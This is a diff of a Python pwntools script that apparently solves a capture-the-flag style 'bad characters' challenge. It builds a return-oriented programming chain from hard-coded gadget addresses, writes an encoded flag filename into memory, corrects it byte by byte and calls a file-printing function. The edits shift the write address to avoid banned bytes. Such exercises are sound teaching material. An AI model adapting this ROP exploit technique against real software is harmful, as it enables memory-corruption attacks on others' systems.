@@ -3,7 +3,7 @@
 from pwn import *
 
 def minorEdits(offset, addValue):
-    addr = p64(6295592 + offset)
+    addr = p64(0x601029 + offset) #forgot to increment this too like a dummy
     addValue = p64(addValue)
     stackAligner = p64(0x00000000004004ee) # ret ;
     regSetAddr = p64(0x00000000004006a0) # pop r14 ; pop r15 ; ret
@@ -19,7 +19,7 @@ def main():
     weasleFlag = b"fk`f-twt"
     weasleKeyPayload = p64(0x0001010101000100)
     weasleKeyPayload = p64(0x000000000000ff62)
-    flagWriteAddr = p64(0x601028)
+    flagWriteAddr = p64(0x601029) #increment the storage by one cuz of the banned chars >:(
 
     # gadgets
     stackAligner = p64(0x00000000004004ee) # ret ;
@@ -38,10 +38,10 @@ def main():
                + setHighRegisters + weasleFlag + flagWriteAddr
                + weasleKeyPayload + flagWriteAddr + stackAligner
                + storeString + minorEdits(1, 1) + minorEdits(2,1)
-               + minorEdits(3,1) + minorEdits(4,1) + minorEdits(7,1)
+               + minorEdits(3,1) + minorEdits(4,1) + minorEdits(6,1)
                + stackAligner + setrdi + flagWriteAddr 
                + stackAligner + printfile)
-    dummyPayload = (junk + stackAligner 
+    dummyPayload = (junk + stackAligner  #this is just here to see if everything "works"
                + setHighRegisters + flag + flagWriteAddr
                + weasleKeyPayload + flagWriteAddr + stackAligner
                + storeString + stackAligner + setrdi 
